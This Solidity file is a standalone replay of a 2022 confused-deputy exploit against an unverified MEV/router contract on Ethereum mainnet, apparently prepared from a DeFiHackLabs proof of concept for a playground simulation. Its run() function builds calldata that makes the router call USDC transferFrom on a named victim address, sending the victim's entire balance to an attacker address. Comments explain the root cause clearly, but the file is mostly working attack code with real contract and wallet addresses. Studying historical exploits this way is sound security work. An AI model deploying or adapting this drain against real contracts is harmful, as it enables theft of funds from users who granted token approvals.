// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-11-MEV_0ad8).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (`Exploit is Test`): there is no standalone exploit contract — the test
// harness itself crafts the raw calldata and low-level-calls the vulnerable
// router. This contract is a faithful, self-contained copy of that inline
// attack so the playground can deploy it and record `run()`. Logic and
// constants are copied verbatim from test/MEV_0ad8_exp.sol.
//
// Root cause: the unverified MEV/router contract at 0x0AD8…afd4 exposes a
// permissionless entry point (selector 0x090f88ca) that takes a caller-supplied
// `bytes` blob and executes it verbatim as a CALL against a caller-supplied
// token address, with the ROUTER as msg.sender. Because the router is a
// frequent swap counterparty, victims had granted it infinite ERC-20
// approvals. The exploit weaponizes that trust: it asks the router to execute
// USDC.transferFrom(victim, attacker, victim's full balance). The router's
// allowance to spend the victim's USDC is type(uint256).max, so the full
// 91,638.11 USDC is swept to the attacker in a single call. No flash loan,
// no price manipulation — one confused-deputy call for the cost of gas.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract MEV0ad8Drain {
    // Ethereum mainnet token constants — copied verbatim from the Foundry test.
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    // The vulnerable MEV/router contract (unverified on-chain).
    address constant VULNERABLE = 0x0AD8229D4bC84135786AE752B9A9D53392A8afd4;

    // The historical victim (granted the router infinite USDC allowance) and
    // attacker (the recipient of the swept USDC) — both verbatim from the test.
    address constant VICTIM = 0x211B6a1137BF539B2750e02b9E525CF5757A35aE;
    address constant ATTACKER = 0xAE39A6c2379BEF53334EA968F4c711c8CF3898b6;

    function run() public {
        // Reconstruct the exact on-chain calldata (test/MEV_0ad8_exp.sol:26-33).
        // abi.encodeWithSelector lays out the bytes arg with a proper offset+length
        // head, which the router's calldata-length validation requires.
        bytes memory payload = abi.encodeWithSelector(
            0x090f88ca, // the router's permissionless "execute action" entry point
            USDC,       // arg0: token the router will CALL
            WETH,       // arg1: second token of the bot's swap ABI (not load-bearing)
            uint256(0), // arg2: unused flag
            uint256(1), // arg3: unused flag
            // arg4: the RAW bytes payload the router executes verbatim:
            //   USDC.transferFrom(victim, attacker, victim's ENTIRE balance)
            abi.encodeWithSelector(
                bytes4(0x23b872dd), // IERC20.transferFrom.selector
                VICTIM,
                ATTACKER,
                IERC20(USDC).balanceOf(VICTIM)
            )
        );

        // Permissionless dispatch — no access control, no auth required.
        (bool ok,) = VULNERABLE.call(payload);
        require(ok, "router call failed");
    }
}
